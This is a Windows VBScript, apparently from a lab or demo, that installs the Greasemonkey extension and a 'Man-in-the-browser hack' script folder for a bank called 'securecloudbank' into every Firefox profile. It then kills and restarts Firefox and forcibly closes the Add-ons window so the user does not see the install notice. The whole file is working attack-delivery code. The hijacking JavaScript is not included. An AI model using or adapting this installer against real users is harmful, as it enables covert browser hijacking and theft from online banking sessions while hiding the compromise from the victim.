'Visual Basic Script which will install greasemonkey for firefox
'and the Man-in-the-browser hack for the securecloudbank which uses greasemonkey
'This script requires the following folders
'{e4a8a97b-f2ed-450b-b12d-ee082ba24781} - greasmonkey extension
'gm_scripts 							- SCB Hack
'This script was tested under:
' Windows 7 64bit Professional - Firefox 3.6.10
'
'
'It will try to detect paths to profile folder of firefox and
'the firefox.exe automatically.
'If it fails you can set the following variable TRUE and set paths manually
'at the bottom of this script (search for ============MANUAL_PATHS============)
MANUAL_PATHS = FALSE

'do not change the following
GREASEMONKEY_NAME="{e4a8a97b-f2ed-450b-b12d-ee082ba24781}"
GM_HACK_DIR=".\gm_scripts"

Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell= WScript.CreateObject("WScript.Shell")

'name of this script
scriptname = Wscript.ScriptFullName
'folder of this script 
scriptpath = fso.getparentfoldername(scriptname)



function getFirefoxPath()
	'get from registry
	ffRegistry = getRegistryValue("HKEY_CURRENT_USER\Software\Classes\FirefoxHTML\shell\open\command\")
	'and extract path
	arr = Split (ffRegistry, """")
	
	'use quotes at the beginning and to handle spaces in filename
	getFirefoxPath = """" & arr(1) & """"
end function

'returns profile folders for all profiles
function getProfileFolders()
	set WshShell = WScript.CreateObject("WScript.Shell") 
	Set fso = CreateObject("Scripting.FileSystemObject")
	appData = WshShell.ExpandEnvironmentStrings("%AppData%")
	profileFolder =  appData & "\Mozilla\Firefox\Profiles"

	Set folder = fso.GetFolder(profileFolder)
  	Set subFolders = folder.SubFolders
  	Dim result()
  	i = 0
  	For each folderIdx In subFolders
  		ReDim result(i)
   		result(i) = profileFolder & "\" & folderIdx.name
   		i = i + 1 
  	Next
  	getProfileFolders = result
end function



sub installGreasemonkey(profileFolders)
	For each folder in profileFolders
		targetDir = folder & "\extensions\" & GREASEMONKEY_NAME
		if not fso.FolderExists(targetDir) then 
			fso.CreateFolder(targetDir)
		end if
	
		fso.CopyFolder scriptpath & "\" &  GREASEMONKEY_NAME, targetDir, true
	Next
end sub

sub installJSHack(profileFolders)
	For each folder in profileFolders
		targetDir = folder & "\" & GM_HACK_DIR
		if not fso.FolderExists(targetDir) then 
			fso.CreateFolder(targetDir)
		end if
		
		fso.CopyFolder scriptpath & "\" & GM_HACK_DIR, targetDir, true
	Next
end sub

sub startFirefox(path)
	'start firefox (it should display window "new add-on installed")
	WshShell.Run path, 2, false
	'check if firefox is already running
	while (NOT isFirefoxRunning())
		WScript.sleep 100
	wend
end sub


function isFirefoxRunning()
	Set WshShell = WScript.CreateObject ("WScript.Shell")
	Set colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process WHERE Name = 'firefox.exe'")

	result = FALSE
	For Each objProcess in colProcessList
		if (objProcess.name = "firefox.exe") then
			result = TRUE
		end if
	Next
	isFirefoxRunning = result
end function

sub killFirefox()
	while (isFirefoxRunning())
		WshShell.Run "TASKKILL /IM firefox.exe", 0, true
	wend
end sub

sub killFirefoxAndAddon()
	
	'firefox hat started but we can not kill before it finished loading (why?)
	'so we try to kill it until it is no longer running
	
	
	while (isFirefoxRunning())	
		'firefox is running, now try to kill addon window
		addonWindowKilled = false
		counter = 0
		while (NOT addonWindowKilled AND counter < 100)
			command = "TASKKILL /FI ""WINDOWTITLE eq Add-ons"""
			Set oExec = WshShell.Exec (command)

			'output of taskkill
          	result = oExec.StdOut.Readline()
			if (NOT InStr (result, "SUCCESS") = 0) then 'addon window killed
				addonWindowKilled = true
			end if
			counter = counter + 1
			WScript.sleep 100
		wend	
		if (counter >= 100) then
			Wscript.echo "Error: Could not find addon window. Continue."
		end if
		killFirefox()
		
	wend
end sub

function getRegistryValue(key)
	Set ws = CreateObject("WScript.Shell")
	getRegistryValue = WshShell.RegRead(key)
end function

'============MANUAL_PATHS============
'Change MANUAL_PATHS variable at the top and set paths below manually
'if automatic detection does not work.
if (MANUAL_PATHS) then
	firefoxPath ="""C:\Program Files (x86)\Mozilla Firefox\firefox.exe"""
	Dim profileFolders(1)
	profileFolders(0) ="C:\Users\Hinni\AppData\Roaming\Mozilla\Firefox\Profiles\nf2jybuf.default" 
else
	firefoxPath = getFirefoxPath()
	profileFolders = getProfileFolders() 
end if



installGreasemonkey(profileFolders)
installJSHack(profileFolders)
'wait until copy is finished (necessary?)
Wscript.Echo "Copying files..."
WScript.Sleep 5000
Wscript.Echo "Finished."

'kill all firefox windows before starting firefox
Wscript.echo "Killing all firefox windows."
killFirefox()
Wscript.echo "Starting firefox."
startFirefox(firefoxPath)

Wscript.echo "Waiting for Add-on window of firefox to start."
killFirefoxAndAddon()
Wscript.echo "Finished."





